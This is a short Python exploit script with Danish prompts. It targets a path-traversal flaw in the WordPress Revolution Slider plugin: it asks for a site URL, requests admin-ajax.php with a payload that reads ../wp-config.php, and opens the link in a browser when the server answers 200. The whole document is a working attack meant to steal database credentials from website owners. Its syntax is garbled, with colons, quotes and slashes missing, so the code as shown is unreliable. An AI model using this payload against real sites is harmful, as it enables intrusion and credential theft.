import requests, webbrowser
from colorama import Fore

r = Fore.RED
g = Fore.YELLOW
w = Fore.RESET

def exploit()

    side = input(f[{r}!{w}] Hjemmeside  )
    exploit = wp-adminadmin-ajax.phpaction=revslider_show_image&img=..wp-config.php

    try
        fuldelink = f{side}{exploit}
        req = requests.get(fuldelink)

    except
        print(f{side} is offline.)
        return

    if req.status_code == 200
        print(fWebside is vuln...)
        webbrowser.open(fuldelink)
        return
    
    if req.status_code == 403
        print(Failed, webside has security...)
        return

    else
        print(fUnknown requets - {req.status_code})

exploit()
